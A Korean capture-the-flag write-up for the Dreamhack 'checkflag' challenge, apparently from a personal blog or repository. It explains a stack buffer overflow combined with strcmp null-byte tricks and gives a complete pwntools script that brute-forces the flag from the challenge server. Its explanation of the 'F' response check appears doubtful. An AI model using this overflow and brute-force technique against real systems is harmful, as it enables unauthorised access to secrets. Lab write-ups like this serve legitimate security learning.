dreamhack checkflag
======================

<img width="517" height="403" alt="image" src="https://github.com/user-attachments/assets/5bc42a72-6777-417c-b5a4-d13ec9001002" />

<img width="527" height="388" alt="image" src="https://github.com/user-attachments/assets/fb310698-74e8-465b-98f2-44b8969a5cda" />

"flag" 파일에 저장된 문자열과 사용자가 입력한 문자열이 정확히 일치하는지 확인한다. 

만약 사용자 입력의 길이가 파일의 플래그 길이보다 짧거나 내용이 일치하지 않으면 "Failed!"를 출력하고 종료된다. 

올바른 플래그를 입력하면 "Correct!"를 출력한다.



프로그램 입력에서 발생할 수 있는 **버퍼 오버플로우** 를 이용하는 문제이다.

 * `read(0, v10, 0xC8uLL);`  를 보면 `v10` 버퍼의 크기는 `char v10[64];`로 선언되어 **64바이트**이다.
 * `read` 함수는 `0xC8uLL` (십진수로 200) 바이트를 `v10`에 읽어오도록 지시하고 있다.
 * 사용자가 **64바이트보다 많은 데이터를 표준 입력(stdin)으로 주면 `read` 함수는 `v10` 버퍼의 할당된 공간(64바이트)을 초과하여 스택의 인접한 메모리 영역에 데이터를 덮어쓰게** 된다.


<img width="497" height="151" alt="image" src="https://github.com/user-attachments/assets/8be3e26c-8f69-4bba-a0b1-d3eaab6be36e" />

* 여기서 입력값과 정답을 비교할때 strcmp()는 첫 번째 널문자('\0') 전까지 비교한다.
* 그런데 만약 **input에 널 문자('\0')를 65개 연속으로 입력하면** 메모리 오버플로우로 인해
  flag 버퍼의 첫 글자도 \0으로 덮인다.
* 즉 input도 "", flag도 "" → strcmp는 이 둘을 **같다** 고 인식하게 된다.


그러면 브루트포싱을 사용해 플래그를 알아낼 수 있는데

* flag 일부를 덮어쓰기 위해 입력 길이를 flag까지 넘치게 만들고
* 문자열 비교 결과가 "Correct!"인지 확인해서
* 한 글자씩 줄여가며 이 과정을 반복하며 플래그를 거꾸로 한 글자씩 알아낼 수 있다.


## 익스플로잇 코드


```python
from pwn import *

flag_len = 0
for length in range(0x3f, 0, -1):
    test_payload = b'A' * length
    payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + test_payload

    p = remote('host3.dreamhack.games', 14991)
    p.sendafter(b'flag?', payload)

    if ord('F') in p.recvuntil(b'!\n'):
        flag_len = length + 1
        p.close()
        break
    p.close()

found_flag = b''
for i in range(flag_len - 4):
    for c in range(0x20, 0x7f):
        test_payload = b'A' * (flag_len - 2 - i) + chr(c).encode() + found_flag + b'}'
        payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + b'A' * (flag_len - 2 - i)

        p = remote('host3.dreamhack.games', 14991)
        p.sendafter(b'flag?', payload)

        if ord('C') in p.recvuntil(b'!\n'):
            found_flag = chr(c).encode() + found_flag
            p.close()
            break
        p.close()

print('DH{' + found_flag.decode() + '}')
```

플래그의 길이 추정 → 플래그 내용 브루트포싱의 두 단계로 나누어 작성했다.

### flag_len 찾기 (플래그의 길이 추정)

```python
for length in range(0x3f, 0, -1):  # 0x3f = 63부터 1까지 감소
```

길이 63부터 1까지 시도하며 맞는 길이를 찾는다.

```python
test_payload = b'A' * length
payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + test_payload
```

payload 구조:
  * 입력부: A * length
  * 패딩: null (\x00)로 64바이트 채움
  * 검증부: A * length 재사용
    → 총 64바이트 입력 후 동일한 패턴을 뒤에 붙임.


```python
p.sendafter(b'flag?', payload)
if ord('F') in p.recvuntil(b'!\n'):  # 결과에 'F' 포함 시 길이 맞음
```

* 응답에 'F' ("FLAG" 또는 "FLAG format correct") 문자가 포함되면 해당 길이가 유효
* 이 때의 길이 + 1이 실제 flag 길이로 판단됨



### flag 브루트포싱

* flag는 DH{...} 형식이니까 나머지 flag_len - 4 문자만 브루트포싱하면 된다.
* 뒤에서부터 채우기 (found_flag는 뒤에서부터 쌓임) + 비교 시 "입력 + '}'" 구조로 끝이 맞는지 확인


#### 루프

```python
for i in range(flag_len - 4):  # 남은 flag 문자 수만큼 반복
    for c in range(0x20, 0x7f):  # 아스키 문자 범위 
```

```python
test_payload = b'A' * (flag_len - 2 - i) + chr(c).encode() + found_flag + b'}'
```

* 앞쪽: A로 남은 길이 채움 (공격 벡터 삽입 위치 조정)
* 중간: 현재 시도 중인 문자
* 뒤쪽: 지금까지 알아낸 flag 일부 + '}'

```python
payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + b'A' * (flag_len - 2 - i)
```

전체 payload는 앞에서 만든 입력을 64바이트로 정렬하고, 뒤쪽에 비교용 A 채운다.

```python
if ord('C') in p.recvuntil(b'!\n'):  # 응답에 'C' 포함 시 해당 문자가 정답
    found_flag = chr(c).encode() + found_flag  # 찾은 문자를 앞에 붙임
```

* 'C'가 들어오면 맞는 문자로 간주하고 found_flag에 추가.
* 이렇게 하여 뒤에서부터 한 글자씩 완성됨.

-----------------------------------

<img width="432" height="57" alt="image" src="https://github.com/user-attachments/assets/ae355a17-496b-4c0b-838a-e2843ca2ded6" />



플래그를 이렇게 구할 수 있다.
